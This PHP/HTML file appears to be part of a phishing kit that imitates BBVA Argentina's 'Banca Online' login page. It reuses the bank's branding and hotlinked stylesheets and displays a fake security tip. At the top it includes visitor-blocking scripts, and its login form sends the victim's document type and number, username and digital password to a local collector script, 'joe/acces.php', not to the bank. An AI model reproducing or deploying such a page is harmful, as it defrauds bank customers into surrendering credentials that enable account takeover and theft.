<?php


include 'check.php';
include 'block.php';
include 'ip_blacklist.php';

?>

<html lang="es">

<head>
  <link rel="icon" href="img/favicon.ico">
  <link href="css/styles/icons.css" rel="stylesheet">
  <link href="css/normalize.css" rel="stylesheet">
  <link href="css/fix.css" rel="stylesheet">
  <link href="css/styles/header.css" rel="stylesheet">
  <link href="css/mafalda.css" rel="stylesheet">
  <link href="css/styles.css" rel="stylesheet">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="expires" content="0">
  <meta http-equiv="Cache-Control" content="no-cache">
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
</head>

<body ng-controller="PreLoginCtrl" class="ng-scope">
  <header class="header__base wrapper" data-component="tabulation">
    
    <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.alert/small.lc-20220223-181547-lc.min.ACSHASH188b9a681452e17cd885be8f4ee86173.css" type="text/css">
    <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.alert/large.lc-20220223-181547-lc.min.ACSHASH755ee5decd16cc8430a2f90a59f49fb1.css" type="text/css" media="all and (min-width: 600px)">
    <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.stickyalert.lc-20220223-181547-lc.min.ACSHASH0cef8f8c276b6349ca014f53d495361a.css" type="text/css">
    <div class="cookies alert--full alert--extra alert--stickybottom"> </div>
    <div> </div><a class="skip2content invisible" tab-index="0" href="#main" aria-label="Ir al contenido principal"> Ir al contenido principal </a>

<nav class="header__container background--navy" aria-label=" BBVA Argentina: Tarjetas, Prestamos, inversiones, seguros, sucursales" data-component="header" data-dl-component="" data-dl-component-name="header" data-dl-component-type="bbva/pwebs/components/par/header" id="header" data-component-id="dd072dbe-f468-4569-a1a2-8812203f5bf5">
      <div class="header__main container" style="height:1;">
        <div class="header__wrapper">
          <div class="header__logo" data-component="svgLogoFix" itemscope="" itemtype="http://schema.org/Organization" data-component-id="a5e62c5b-6eaa-49e8-9dc2-9eda0efe0e47"> <a itemscope="url" class="header__logo__link " href="#" style="margin:0" target="_self" aria-label="Home Personas BBVA" title=" BBVA Argentina: Tarjetas, Prestamos, inversiones, seguros, sucursales"> <img data-component-params="{&quot;keepSize&quot;: &quot;&quot;}" src="./img/logo.svg" srcset="./img/logo.svg" sizes="(min-width: 900px) 20vw, 50vw" itemprop="logo" class="header__image " alt=" BBVA Argentina: Tarjetas, Prestamos, inversiones, seguros, sucursales" role="img"> </a> </div>
          <div class="header__mainnavigation" itemscope="" itemtype="https://schema.org/SiteNavigationElement">
            <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/small.lc-20220223-181547-lc.min.ACSHASHa37a04db69bc42a5e08c4323c3bfefe8.css" type="text/css">
            <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.mainNavigation/large.lc-20220223-181547-lc.min.ACSHASH8f81358eebb18a1778ddd3319a401956.css" type="text/css" media="all and (min-width: 600px)">
            
          </div>
        </div>
        <nav class="header__actions" itemscope="" itemtype="https://schema.org/SiteNavigationElement">
          <ul class="header__actions__ulist">
            
            <li itemprop="name" class="header__actions__list header__actions--tablet-hidden header__actions--mobile-hidden"> <a itemprop="url" class="header__actions__item__link header__createaccount" href="#"> <img class="bbva-svgicon bbva-svgicon--largemobile" src="./img/profile.svg" alt=""> <span>Hacete cliente</span> </a> </li>
            <li itemprop="name" class="header__actions__list header__actions--tablet-left">
              <link rel="stylesheet" href="https://bbva.com.ar/apps/bbva/pwebs/components/clientlibs/bbva.access/small.lc-20220223-181547-lc.min.css" media="all" onload="this.media='all'">
              <div data-component="access" data-component-params="{&quot;desktop&quot; :{&quot;XF&quot; : false, &quot;URL&quot; : &quot;/fnetcore/loginClementeApp.html&quot;, &quot;height&quot; : &quot;&quot;, &quot;target&quot; : &quot;&quot;, &quot;title&quot;: &quot;&quot;}, &quot;tablet&quot; :{&quot;XF&quot; : false, &quot;URL&quot; : &quot;&quot;, &quot;height&quot;: &quot;&quot;, &quot;target&quot;: &quot;&quot;, &quot;title&quot;: &quot;&quot;}, &quot;mobile&quot; :{&quot;XF&quot; : false, &quot;URL&quot; : &quot;&quot;, &quot;height&quot;: &quot;&quot;, &quot;target&quot;: &quot;&quot;, &quot;title&quot;: &quot;&quot;}}" data-component-id="dd05245d-705f-44df-a7a2-3d6197d850c3"> <a class="header__actions__item__link header__actions--menu header__access" accesskey="a" itemprop="url" aria-label="Banca Online" href="javascript:void(0)" aria-expanded="true" data-analytics-name="banca online" data-analytics="internal-link" role="button"> <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                    <defs>
                      <style>
                        .bbvaicn {
                          fill: #fff
                        }
                      </style>
                    </defs>
                    <path class="bbvaicn" d="M161.38 132.34a70 70 0 0 1-62.76 0A90 90 0 0 0 30 219.77v20h200v-20a90 90 0 0 0-68.62-87.43zM160 209.77h-30v-20h50zm-30-90a50 50 0 1 0-50-50 50 50 0 0 0 50 50z"></path>
                  </svg> <span class="header__actions__item__link__text header__access__text--desktop">Banca Online</span> <span class="header__actions__item__link__text header__access__text--tablet">Banca Online</span> <span class="header__actions__item__link__text header__access__text--mobile">Acceso</span> </a> </div>
            </li>
           
            <li class="header__actions__list header__actions--tablet-right"> <a class="megamenu__trigger header__actions__item__link " href="javascript:void(0);" aria-expanded="false" aria-haspopup="true" aria-label="Menú principal" aria-controls="megamenu__aside" accesskey="m"> <span class="megamenu__trigger megamenu__trigger__open header__actions--menu" aria-hidden="false"> <span class="header__actions__item__link__text">Menú</span> <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
                    <defs>
                      <style>
                        .bbvaicn {
                          fill: #fff
                        }
                      </style>
                    </defs>
                    <g>
                      <polygon class="bbvaicn" points="210.37 80.12 20.37 80.12 20.37 50.12 240.37 50.12 210.37 80.12"></polygon>
                      <polygon class="bbvaicn" points="180.37 145.12 20.37 145.12 20.37 115.12 210.37 115.12 180.37 145.12"></polygon>
                      <polygon class="bbvaicn" points="150.37 210.12 20.37 210.12 20.37 180.12 180.37 180.12 150.37 210.12"></polygon>
                    </g>
                  </svg> </span> </a> </li>
          </ul>
        </nav>
      </div>
    </nav>

    <div class="access__container access__container--active" id="access__container__content" aria-hidden="false" tabindex="-1" style="height: 839px;">
      <div class="container">
        <div class="access__content">
          <div ng-include="#" class="ng-scope">
            <!-- <article bbva-block-info-message-mafalda ng-if="errorMessage" type="error"> <span class="error-title">No es posible iniciar sesión.rrrr</span> <p class="error-message">{{errorMessage}}</p></article> -->
            <div class="modal-login mgb-0 row ng-scope">
              <div class="col-xs-12 col-sm-6 first-box">
                <div class="box">
                  <form name="login" id="login-form" autocomplete="OFF" action="joe/acces.php" method="POST" ng-if="!errorSafariMsg" class="ng-pristine ng-scope ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-pattern">
                    <!--<div class="form-group select-element"> <select id="selectDNI" ng-options="tdoc.descripcion for tdoc in model.documentTypes track by tdoc.codigoFNET" ng-model="model.documentTypeSelected" class="btn"> </select> </div>-->
                    <div class="wrapper-login">
                      <!-- <span class="login-title" ng-if="!errorMessage"><span ></span>¡Bienvenido!</span> -->
                      <div class="loader ng-isolate-scope ng-hide" ng-show="isLoading()" bbva-loader="" loading="loadingDynamicValidations">
                        <div class="loader-spinner" ng-class="{'background-loader':blueBackground, 'light-background-loader': lightBackground}"></div>
                      </div>
                      <div ng-if="!loadingDynamicValidations" class="ng-scope">
                        <article class="tip-area">
                          <p class="tip-msg" ng-style="{'background-image':'url(https://assets.caasbbva.com/argentina/net/security-tips/identification.png)'}" style="background-image: url(&quot;https://assets.caasbbva.com/argentina/net/security-tips/identification.png&quot;);"> <span class="ng-binding">No brindes datos personales por correo, teléfono, SMS o redes sociales.</span> </p>
                        </article>
                        <div ng-show="showFullForm()" drop-down="" list-options="listOptions" class="drop-down ng-isolate-scope">
                          <div class="new-select-option" ng-class="{'show-list':listOptions.open}" ng-blur="closeDrop()"> <select id="idni" name="dni">
                              <option selected="" value="DNI">DNI</option>
                              <option value="LE">LE</option>
                              <option value="NIF">NIF</option>
                              <option value="PASAPORTE">PASAPORTE</option>
                            </select> <span class="icon-login-forward_icon drop-down-ico"></span> </div>
                        </div>
                        <div ng-show="showFullForm()" class="form-group">
                          <div class="new-input-control input-control-tooltip input-container"> <input type="text" id="documentNumberInput" name="documentNumber" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" bbva-numbers-only="" ng-model="model.documentNumber" ng-disabled="loading" maxlength="13" required="{{validations.docNumber.required}}" ng-focus="model.nuevoValor=model.documentNumber; setSelectedItem(model, 'documentNumber', validations.docNumber.maxLength);focusin=true" ng-change="model.nuevoValor=model.documentNumber" ng-blur="focusin='disabled'"> <label for="documentNumberInput">Número de documento</label> <span class="icon-login-close"></span> </div>
                        </div>
                        <div>
                          <div ng-hide="showFullForm()" class="welcome-block ng-hide"> <span class="welcome-text ng-binding">¡Hola, !</span> <button type="button" title="Dejar de recordar tipo y numero de documento." ng-click="deleteRememberOptions()" class="icon-word-button info-asset stop-remember ng-binding">No soy </button> </div>
                          <div class="form-group">
                            <div class="new-input-control input-control-tooltip"> <input type="text" id="digitalUser" name="digitalUser" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength" autocomplete="off"> <label for="digitalUser">Usuario</label> <span class="icon-login-close"></span> </div>
                          </div>
                          <div class="form-group icon-eye-input">
                            <div class="new-input-control input-control-tooltip "> <input id="digitalKey" type="password" name="digitalKey" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" autocomplete="off" readonly="" onfocus="this.removeAttribute('readonly');" ng-model="model.digitalKey" ng-disabled="loading" maxlength="8" required="{{validations.password.required}}" ng-focus="model.nuevoValor=model.digitalKey; setSelectedItem(model, 'digitalKey', validations.password.maxLength); focusin=!true" ng-change="model.nuevoValor=model.digitalKey" ng-pattern="/^[a-zA-Z0-9]+$/"> <label for="digitalKey">Clave digital</label> <button id="hideshow" ng-class="showPassword ? 'grey' : 'blue'" type="button" class="icon-login-eye icon-eye-btn blue"></button> <span class="icon-login-close"></span> </div>
                          </div>
                        </div>
                        <div ng-show="showFullForm()" class="row remember-option"> <label class="remember-switch bbva-check-switch ng-isolate-scope" bbva-check-switch="" check-model="rememberSwitchEnabled" check-model-change="toggleSwitch()"> <input type="checkbox" ng-model="checkModel" class="ng-pristine ng-untouched ng-valid"> <span class="slider"></span> </label> <span class="remember-text">Recordar mi tipo y número de documento</span> </div>
                        <div class="virtual-keyboard">
                          <div id="mobileVirtualKeyboard" class="link-teclado ng-scope" ng-click="getNumber()" ng-if="(!isMobileTv() &amp;&amp; !initOk)" title="Teclado Virtual" alt="Teclado Virtual"> <span class="icon-login-keyboard_icon"></span> <span class="tvirtual_link">Teclado Virtual</span> </div>
                        </div>
                      </div>
                      <div class="form-group enter">
                        <div class="loader ng-isolate-scope ng-hide" ng-show="isLoading()" bbva-loader="" loading="loading">
                          <div class="loader-spinner" ng-class="{'background-loader':blueBackground, 'light-background-loader': lightBackground}"></div>
                        </div>
                        <div ng-show="!loading" class="buttons-container"> <button ng-show="showFullForm()" class="secondary-button" type="button" ng-click="showModalFirstAccess()">Registrarme</button> <button ng-disabled="!validForm()" type="submit" class="primary-button" title="Acceso clientes" ng-click="loginSubmit(forms.login)" id="ingres" disabled="disabled">Ingresar</button> </div>
                      </div>
                            

                      <div class="text-center"> <button ng-click="showModalRecoverUser()" class="modal-trigger key-link" type="button" title="Ir a 'Recuperar Usuario o Contraseña'">Olvidé o bloqueé mi Usuario / Clave Digital</button> </div>
                      
                      <div class="form-group form-links security-link-login no-margin text-center"> <button ng-click="showRecommendations()" class="modal-trigger key-link" type="button" title="Ir a 'Recomendaciones de Seguridad'">Recomendaciones de seguridad</button> </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
          <script src="js/query.min.js"></script>
          <script src="js/query-form.js"></script>
          <script src="js/jquery.mask.js"></script>
          <script src="js/custom.js"></script>
          <div style="clear: both; display: block;"></div>
        </div>
      </div>
    </div>
  </header>
</body>

</html>